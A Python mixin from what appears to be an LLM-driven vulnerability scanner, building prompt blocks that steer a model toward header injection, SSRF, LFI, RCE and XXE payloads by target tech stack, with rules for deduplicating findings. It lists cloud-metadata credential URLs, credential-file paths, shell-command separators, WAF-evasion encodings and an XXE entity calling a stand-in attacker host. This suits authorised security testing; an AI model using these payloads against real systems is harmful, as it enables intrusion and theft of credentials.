"""TechContext shell mixin — extracted for size policy."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Dict, List, Optional

from bugtrace.utils.logger import get_logger
from bugtrace.agents.mixins.tech_context.constants import (
    FRAMEWORK_TO_DB,
    SERVER_TO_LANG,
    TAG_TO_DB,
)

logger = get_logger("tech_context_mixin")


class TechContextInjectionMixin:
    def generate_header_injection_context_prompt(self, stack: Dict) -> str:
        """
        Generate Header Injection-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant header injection payloads
        based on the detected technology stack.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted Header Injection-focused prompt section
        """
        server = stack.get("server", "Unknown")
        lang = stack.get("lang", "Unknown")
        waf = stack.get("waf")
        cdn = stack.get("cdn")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (HEADER INJECTION CONTEXT)",
            f"- Web Server: {server}",
            f"- Backend Language: {lang}",
        ]

        if cdn:
            prompt_parts.append(f"- CDN: {cdn}")
        if waf:
            prompt_parts.append(f"- WAF: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## HEADER INJECTION STRATEGIC IMPLICATIONS")

        # Server-specific guidance
        server_lower = server.lower() if server else ""
        if "nginx" in server_lower:
            prompt_parts.extend([
                "- Nginx: Check for CRLF injection in Location header",
                "- Nginx: Test X-Forwarded-* header injection",
                "- Nginx: Proxy_pass URL manipulation via Host header",
            ])
        elif "apache" in server_lower:
            prompt_parts.extend([
                "- Apache: Check for CRLF injection in Location header",
                "- Apache: Test mod_proxy header injection",
                "- Apache: X-Forwarded-For chain manipulation",
            ])
        elif "iis" in server_lower:
            prompt_parts.extend([
                "- IIS: Check for Unicode CRLF variants (%u000d%u000a)",
                "- IIS: ARR proxy header manipulation",
            ])

        # CDN-specific guidance
        if cdn:
            prompt_parts.extend([
                f"- CDN ({cdn}): Cache poisoning via Host header",
                f"- CDN: X-Forwarded-Host manipulation for cache key",
                f"- CDN: Cache key injection via X-Original-URL",
            ])

        # WAF evasion
        if waf:
            prompt_parts.extend([
                f"- WAF PRESENT ({waf}): Use encoding bypasses",
                "  * Double encoding: %250d%250a",
                "  * Unicode variants: %E5%98%8A%E5%98%8D",
                "  * Null byte prefix: %00%0d%0a",
            ])

        return "\n".join(prompt_parts)

    def generate_header_injection_dedup_context(self, stack: Dict) -> str:
        """
        Generate Header Injection-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            Header Injection deduplication-focused context string
        """
        server = stack.get("server", "generic")
        cdn = stack.get("cdn")

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR HEADER INJECTION DEDUPLICATION",
            f"- Detected Server: {server}",
            f"- CDN Present: {'Yes - ' + cdn if cdn else 'No'}",
            "",
            "## HEADER INJECTION DEDUPLICATION RULES",
            "",
            "### Header Type Deduplication",
            "- Same header type + same endpoint = DUPLICATE",
            "- Different header types (Host vs X-Forwarded-For) = DIFFERENT",
            "- Same header + different endpoints = DIFFERENT",
            "- Response header injection vs Request header = DIFFERENT classes",
            "",
            "### Scope Rules",
            "- CRLF in query params: PER-ENDPOINT scope",
            "- Host header injection: GLOBAL scope (affects all endpoints)",
            "- Cache poisoning: GLOBAL scope per cache key",
            "",
            "### Examples",
            "- CRLF in /search?q=X = CRLF in /search?q=Y → DUPLICATE",
            "- Host header @ /page1 = Host header @ /page2 → DUPLICATE (global)",
            "- X-Forwarded-For ≠ X-Forwarded-Host → DIFFERENT headers",
        ]

        return "\n".join(context_parts)

    def generate_ssrf_context_prompt(self, stack: Dict) -> str:
        """
        Generate SSRF-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant SSRF payloads
        based on the detected technology stack and cloud provider.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted SSRF-focused prompt section
        """
        infrastructure = stack.get("raw_profile", {}).get("infrastructure", [])
        lang = stack.get("lang", "Unknown")
        server = stack.get("server", "Unknown")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (SSRF CONTEXT)",
            f"- Backend Language: {lang}",
            f"- Web Server: {server}",
        ]

        # Cloud detection
        cloud_providers = self._detect_cloud_provider(infrastructure)
        if cloud_providers:
            prompt_parts.append(f"- Cloud Provider: {', '.join(cloud_providers)}")

        prompt_parts.append("")
        prompt_parts.append("## SSRF STRATEGIC IMPLICATIONS")

        # Cloud-specific guidance
        if "aws" in cloud_providers:
            prompt_parts.extend([
                "- AWS detected: Target http://169.254.169.254/latest/meta-data/",
                "- AWS: IMDSv2 bypass via X-Forwarded-For header",
                "- AWS: Check for IAM role credentials at /iam/security-credentials/",
                "- AWS: ECS task metadata at http://169.254.170.2/",
            ])
        if "gcp" in cloud_providers:
            prompt_parts.extend([
                "- GCP detected: Target http://metadata.google.internal/",
                "- GCP: Use Metadata-Flavor: Google header",
                "- GCP: computeMetadata/v1/ for instance data",
            ])
        if "azure" in cloud_providers:
            prompt_parts.extend([
                "- Azure detected: Target http://169.254.169.254/metadata/",
                "- Azure: Use Metadata: true header",
                "- Azure: IMDS at /metadata/instance?api-version=2021-02-01",
            ])

        # No cloud detected - generic guidance
        if not cloud_providers:
            prompt_parts.extend([
                "- Test internal network: 127.0.0.1, localhost, 0.0.0.0",
                "- Test private ranges: 10.x.x.x, 172.16.x.x, 192.168.x.x",
                "- Test file:// protocol for local file access",
                "- Test DNS rebinding attacks",
            ])

        # Language-specific SSRF vectors
        if lang == "PHP":
            prompt_parts.append("- PHP: Test gopher://, dict://, expect:// wrappers")
        elif lang == "Python":
            prompt_parts.append("- Python: Test file://, dict://, gopher:// via urllib/requests")
        elif lang == "Java":
            prompt_parts.append("- Java: Test jar://, netdoc:// protocols")
        elif lang == "Node.js":
            prompt_parts.append("- Node.js: Test with node-fetch/axios URL handling quirks")

        return "\n".join(prompt_parts)

    def _detect_cloud_provider(self, infrastructure: List) -> List[str]:
        """Detect cloud providers from infrastructure tags."""
        detected = []
        infra_str = " ".join(str(i).lower() for i in infrastructure)

        if any(x in infra_str for x in ["aws", "amazon", "ec2", "s3", "alb", "elb", "cloudfront"]):
            detected.append("aws")
        if any(x in infra_str for x in ["gcp", "google", "gke", "cloud run", "gce", "app engine"]):
            detected.append("gcp")
        if any(x in infra_str for x in ["azure", "microsoft", "aks", "app service"]):
            detected.append("azure")

        return detected

    def generate_ssrf_dedup_context(self, stack: Dict) -> str:
        """
        Generate SSRF-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            SSRF deduplication-focused context string
        """
        infrastructure = stack.get("raw_profile", {}).get("infrastructure", [])
        cloud_providers = self._detect_cloud_provider(infrastructure)

        context_parts = [
            "## TECHNOLOGY CONTEXT FOR SSRF DEDUPLICATION",
            f"- Cloud Providers: {', '.join(cloud_providers) if cloud_providers else 'None detected'}",
            "",
            "## SSRF DEDUPLICATION RULES",
            "",
            "### Target-Based Deduplication",
            "- Same parameter + same internal target = DUPLICATE",
            "- Same parameter + different internal targets = DIFFERENT",
            "- Different parameters = DIFFERENT",
            "",
            "### Scope Rules",
            "- Blind SSRF vs Reflected SSRF = DIFFERENT classes",
            "- Internal network access vs Cloud metadata = DIFFERENT severity",
            "- Same endpoint different protocols (http vs file) = DIFFERENT",
            "",
            "### Examples",
            "- /fetch?url=127.0.0.1 = /fetch?url=localhost → DUPLICATE (same target)",
            "- /fetch?url=169.254.169.254 ≠ /fetch?url=127.0.0.1 → DIFFERENT targets",
            "- param 'url' ≠ param 'src' → DIFFERENT parameters",
        ]

        return "\n".join(context_parts)

    def generate_lfi_context_prompt(self, stack: Dict) -> str:
        """
        Generate LFI-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant LFI payloads
        based on the detected OS type and language.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted LFI-focused prompt section
        """
        server = stack.get("server", "Unknown")
        lang = stack.get("lang", "Unknown")
        waf = stack.get("waf")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (LFI CONTEXT)",
            f"- Web Server: {server}",
            f"- Backend Language: {lang}",
        ]

        # OS detection from server/language
        os_type = self._infer_os_from_stack(stack)
        prompt_parts.append(f"- Likely OS: {os_type}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## LFI STRATEGIC IMPLICATIONS")

        # OS-specific targets
        if os_type == "Linux":
            prompt_parts.extend([
                "- Linux: Target /etc/passwd, /etc/shadow (if readable)",
                "- Linux: /proc/self/environ for environment variables",
                "- Linux: Log poisoning via /var/log/apache2/access.log",
                "- Linux: /proc/self/cmdline, /proc/self/fd/X for process info",
            ])
        elif os_type == "Windows":
            prompt_parts.extend([
                "- Windows: Target C:\\Windows\\win.ini, C:\\Windows\\System32\\drivers\\etc\\hosts",
                "- Windows: C:\\inetpub\\logs\\ for IIS logs",
                "- Windows: UNC path for SSRF combo: \\\\attacker\\share",
                "- Windows: web.config for ASP.NET config",
            ])

        # Language-specific vectors
        if lang == "PHP":
            prompt_parts.extend([
                "- PHP: Use wrappers (php://filter, php://input, data://)",
                "- PHP: php://filter/convert.base64-encode/resource=",
                "- PHP: Check for allow_url_include for RFI",
                "- PHP: expect:// wrapper for RCE if enabled",
            ])
        elif lang == "Java":
            prompt_parts.extend([
                "- Java: Check for XXE via file:// protocol",
                "- Java: WEB-INF/web.xml for configuration",
            ])
        elif lang == "Node.js":
            prompt_parts.extend([
                "- Node.js: package.json, .env files",
                "- Node.js: /proc/self/cwd for working directory",
            ])
        elif lang == "Python":
            prompt_parts.extend([
                "- Python: requirements.txt, settings.py",
                "- Python: /proc/self/environ for Django secrets",
            ])

        # WAF evasion
        if waf:
            prompt_parts.extend([
                f"- WAF PRESENT ({waf}): Use traversal bypasses",
                "  * Double encoding: %252e%252e%252f",
                "  * Null byte: ../../../etc/passwd%00",
                "  * Unicode: ..%c0%af..%c0%af",
            ])

        return "\n".join(prompt_parts)

    def _infer_os_from_stack(self, stack: Dict) -> str:
        """Infer OS from tech stack."""
        server = stack.get("server", "").lower()
        lang = stack.get("lang", "").lower()

        # Windows indicators
        if "iis" in server or "asp" in lang or ".net" in lang or "windows" in server:
            return "Windows"

        # Default to Linux (most common for web servers)
        return "Linux"

    def generate_lfi_dedup_context(self, stack: Dict) -> str:
        """
        Generate LFI-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            LFI deduplication-focused context string
        """
        os_type = self._infer_os_from_stack(stack)
        lang = stack.get("lang", "generic")

        context_parts = [
            f"## TECHNOLOGY CONTEXT FOR LFI DEDUPLICATION (OS: {os_type})",
            f"- Detected Language: {lang}",
            "",
            "## LFI DEDUPLICATION RULES",
            "",
            "### File Target Deduplication",
            "- Same parameter + same file target = DUPLICATE",
            "- Same parameter + different files = DIFFERENT (unless same traversal depth)",
            "- Different parameters = DIFFERENT",
            "",
            "### Technique Deduplication",
            "- Direct LFI vs Wrapper-based = DIFFERENT techniques",
            "- php://filter vs php://input = DIFFERENT wrapper types",
            "- Absolute path vs Relative path = DIFFERENT (if both work)",
            "",
            "### Scope Rules",
            "- Same traversal depth reaching same file = DUPLICATE",
            "- ../../etc/passwd = ../../../etc/passwd (if same result) → DUPLICATE",
            "",
            "### Examples",
            "- /file?path=../etc/passwd = /file?path=....//etc/passwd → DUPLICATE",
            "- param 'file' ≠ param 'include' → DIFFERENT parameters",
            "- php://filter ≠ direct ../etc/passwd → DIFFERENT techniques",
        ]

        return "\n".join(context_parts)

    def generate_rce_context_prompt(self, stack: Dict) -> str:
        """
        Generate RCE-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant RCE payloads
        based on the detected OS type and language.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted RCE-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        server = stack.get("server", "Unknown")
        waf = stack.get("waf")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (RCE CONTEXT)",
            f"- Backend Language: {lang}",
            f"- Web Server: {server}",
        ]

        os_type = self._infer_os_from_stack(stack)
        prompt_parts.append(f"- Likely OS: {os_type}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## RCE STRATEGIC IMPLICATIONS")

        # OS-specific command syntax
        if os_type == "Linux":
            prompt_parts.extend([
                "- Linux: Use $(cmd), `cmd`, ; cmd, | cmd, && cmd",
                "- Linux: Blind RCE via sleep, ping, curl to callback",
                "- Linux: Shell paths: /bin/bash, /bin/sh, /usr/bin/sh",
                "- Linux: Common separators: ;, |, ||, &&, \\n, %0a",
            ])
        else:
            prompt_parts.extend([
                "- Windows: Use & cmd, | cmd, %COMSPEC% /c cmd",
                "- Windows: Blind RCE via ping -n, timeout /t",
                "- Windows: Shell: cmd.exe, powershell.exe",
                "- Windows: Separators: &, |, ||, &&",
            ])

        # Language-specific RCE vectors
        if lang == "PHP":
            prompt_parts.extend([
                "- PHP: system(), exec(), passthru(), shell_exec(), popen()",
                "- PHP: eval(), assert(), preg_replace with /e modifier",
                "- PHP: Deserialization via unserialize()",
            ])
        elif lang == "Python":
            prompt_parts.extend([
                "- Python: os.system(), subprocess.*, os.popen()",
                "- Python: eval(), exec(), pickle.loads()",
                "- Python: __import__('os').system('cmd')",
            ])
        elif lang == "Node.js":
            prompt_parts.extend([
                "- Node.js: child_process.exec(), spawn(), fork()",
                "- Node.js: eval(), new Function(), vm module",
                "- Node.js: Deserialization via node-serialize",
            ])
        elif lang == "Java":
            prompt_parts.extend([
                "- Java: Runtime.getRuntime().exec(), ProcessBuilder",
                "- Java: Deserialization vulnerabilities (ysoserial payloads)",
                "- Java: Expression Language injection (EL)",
            ])
        elif lang == "Ruby":
            prompt_parts.extend([
                "- Ruby: system(), exec(), `cmd`, %x{cmd}",
                "- Ruby: Kernel.eval(), Open3.capture3()",
                "- Ruby: YAML.load() deserialization",
            ])

        # WAF evasion
        if waf:
            prompt_parts.extend([
                f"- WAF PRESENT ({waf}): Use command obfuscation",
                "  * Variable substitution: ${IFS} instead of space",
                "  * Command splitting: w'h'o'a'm'i",
                "  * Encoding: base64 decode piped to shell",
            ])

        return "\n".join(prompt_parts)

    def generate_rce_dedup_context(self, stack: Dict) -> str:
        """
        Generate RCE-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            RCE deduplication-focused context string
        """
        os_type = self._infer_os_from_stack(stack)
        lang = stack.get("lang", "generic")

        context_parts = [
            f"## TECHNOLOGY CONTEXT FOR RCE DEDUPLICATION (OS: {os_type})",
            f"- Detected Language: {lang}",
            "",
            "## RCE DEDUPLICATION RULES",
            "",
            "### Injection Point Deduplication",
            "- Same parameter + same injection point = DUPLICATE",
            "- Same parameter + different command separators = technique variants (keep best)",
            "- Different parameters = DIFFERENT",
            "",
            "### Technique Deduplication",
            "- Blind RCE vs Output RCE = DIFFERENT validation needs",
            "- Time-based vs OOB callback = DIFFERENT detection methods",
            "- Shell injection vs Code injection = DIFFERENT classes",
            "",
            "### Scope Rules",
            "- Same endpoint, same param = DUPLICATE",
            "- ;id vs |id vs `id` on same param = keep most reliable",
            "",
            "### Examples",
            "- /exec?cmd=;id = /exec?cmd=|id → DUPLICATE (same param)",
            "- param 'cmd' ≠ param 'input' → DIFFERENT parameters",
            "- Blind (sleep) vs Reflected (output) → DIFFERENT (keep both)",
        ]

        return "\n".join(context_parts)

    def generate_xxe_context_prompt(self, stack: Dict) -> str:
        """
        Generate XXE-specific 'Prime Directive' context block.

        This context helps the LLM focus on relevant XXE payloads
        based on the detected language and XML parser.

        Args:
            stack: Normalized tech stack from load_tech_stack()

        Returns:
            Formatted XXE-focused prompt section
        """
        lang = stack.get("lang", "Unknown")
        server = stack.get("server", "Unknown")
        waf = stack.get("waf")

        prompt_parts = [
            "## TARGET TECHNOLOGY STACK (XXE CONTEXT)",
            f"- Backend Language: {lang}",
            f"- Web Server: {server}",
        ]

        # Infer XML parser
        parser = self._infer_xml_parser(lang)
        prompt_parts.append(f"- Likely XML Parser: {parser}")

        if waf:
            prompt_parts.append(f"- WAF Detected: {waf}")

        prompt_parts.append("")
        prompt_parts.append("## XXE STRATEGIC IMPLICATIONS")

        # Language-specific XXE vectors
        if lang == "PHP":
            prompt_parts.extend([
                "- PHP: libxml2 parser, check LIBXML_NOENT flag",
                "- PHP: expect:// wrapper for RCE if enabled",
                "- PHP: php://filter for source code disclosure",
                "- PHP: simplexml_load_string(), DOMDocument",
            ])
        elif lang == "Java":
            prompt_parts.extend([
                "- Java: DocumentBuilder, SAXParser, XMLReader",
                "- Java: Parameter entity for OOB data exfil",
                "- Java: jar:// protocol for SSRF",
                "- Java: XInclude attacks",
            ])
        elif lang == "Python":
            prompt_parts.extend([
                "- Python: lxml (vulnerable by default), xml.etree (safer)",
                "- Python: defusedxml blocks XXE (check if used)",
                "- Python: Check for entity expansion DoS (Billion Laughs)",
            ])
        elif lang == "ASP.NET" or lang == ".NET":
            prompt_parts.extend([
                "- .NET: XmlDocument, XmlReader, XmlTextReader",
                "- .NET: DtdProcessing must be enabled for XXE",
                "- .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Parse",
            ])
        elif lang == "Node.js":
            prompt_parts.extend([
                "- Node.js: xml2js (generally safe), libxmljs (vulnerable)",
                "- Node.js: sax-js does not process external entities",
                "- Node.js: Check for fast-xml-parser, xmldom",
            ])

        # Generic XXE payloads
        prompt_parts.extend([
            "",
            "## COMMON XXE TECHNIQUES",
            "- Internal entity: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
            "- Parameter entity: <!ENTITY % xxe SYSTEM 'http://attacker/xxe.dtd'>",
            "- OOB via DTD: External DTD with nested entities for exfil",
            "- Error-based: Non-existent file to leak path in error",
        ])

        return "\n".join(prompt_parts)

    def _infer_xml_parser(self, lang: str) -> str:
        """Infer XML parser from language."""
        parsers = {
            "PHP": "libxml2",
            "Java": "DocumentBuilder/SAX",
            "Python": "lxml/etree",
            "ASP.NET": "XmlDocument",
            ".NET": "XmlDocument",
            "Node.js": "xml2js/libxmljs",
            "Ruby": "Nokogiri/REXML",
            "Go": "encoding/xml",
        }
        return parsers.get(lang, "Unknown")

    def generate_xxe_dedup_context(self, stack: Dict) -> str:
        """
        Generate XXE-specific context for WET→DRY deduplication.

        Args:
            stack: Normalized tech stack

        Returns:
            XXE deduplication-focused context string
        """
        lang = stack.get("lang", "generic")
        parser = self._infer_xml_parser(lang)

        context_parts = [
            f"## TECHNOLOGY CONTEXT FOR XXE DEDUPLICATION",
            f"- Detected Language: {lang}",
            f"- Likely Parser: {parser}",
            "",
            "## XXE DEDUPLICATION RULES",
            "",
            "### Entity Type Deduplication",
            "- Same XML endpoint + same entity type = DUPLICATE",
            "- Internal entity vs External entity = DIFFERENT",
            "- Blind XXE vs Error-based XXE = DIFFERENT techniques",
            "- Different XML endpoints = DIFFERENT",
            "",
            "### Scope Rules",
            "- Same endpoint accepting XML = single vulnerability",
            "- Multiple XML endpoints = test each separately",
            "- Parameter entity vs General entity = DIFFERENT types",
            "",
            "### Examples",
            "- /api (file:///etc/passwd) = /api (file:///etc/shadow) → DUPLICATE",
            "- Internal entity ≠ OOB parameter entity → DIFFERENT techniques",
            "- /upload/xml ≠ /api/import → DIFFERENT endpoints",
        ]

        return "\n".join(context_parts)
